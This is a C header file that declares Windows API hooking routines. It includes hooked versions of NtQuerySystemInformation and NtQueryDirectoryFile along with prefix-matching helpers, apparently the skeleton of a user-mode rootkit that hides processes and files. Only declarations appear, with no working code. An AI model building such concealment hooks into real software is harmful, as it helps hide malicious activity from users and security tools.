#pragma once

VOID InitHooks();

BOOL InstallHook(LPCSTR function, LPVOID* originalFunction, LPVOID* hookedFunction, LPVOID* newFunction);
BOOL UnHook();

BOOL HasPrefix(LPCWSTR str);
BOOL HasPrefixU(UNICODE_STRING str);



NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NTSTATUS NTAPI hookedNtQueryDir(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);